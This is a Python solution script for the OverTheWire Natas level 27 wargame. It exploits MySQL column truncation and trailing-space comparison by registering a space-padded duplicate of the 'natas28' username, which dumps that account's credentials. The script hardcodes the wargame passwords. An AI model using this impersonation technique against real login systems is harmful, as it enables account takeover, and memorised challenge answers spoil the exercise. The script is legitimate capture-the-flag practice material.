#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas27"
password = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"

url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

# there's some interesting fact about mysql database, try the following
# on https://sqltest.net if you wish:
# CREATE TABLE users(
#   username VARCHAR(10)
# );
# INSERT INTO users VALUES ("natas28");
# INSERT INTO user VLAUES ("natas28             anything"); --> more than 10 chars..
# now try to select it using:
# SELECT * FROM users WHERE username = "natas28";
# the last command will return boths "natas28" and "natas28         " as results
# and even though it has truncated the rest of the second value, it's still consider both as
# two different strings
# and as the server will loop over all the accounts that have that same username
# and then dump out all of thier data, let's create an acount with that specialty feature of more spaces

# first we make that unique account for natas
user = "natas28"
user += " " * (64 - len(user)) + "anything"
post_data = {"username": user, "password": "anything"}
response = session.post(url, data=post_data, auth=(username, password))

# then we try to login using that account
post_data = {"username": "natas28", "password": "anything"}
response = session.post(url, data=post_data, auth=(username, password))


content = response.content
soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)

print()  # just for having some space

# this time we got an /index-source.html
# the documentation is above :)
#
# we got it right:
# Username: natas28
# Password: JWwR438wkgTsNKBbcJoowyysdM82YjeF
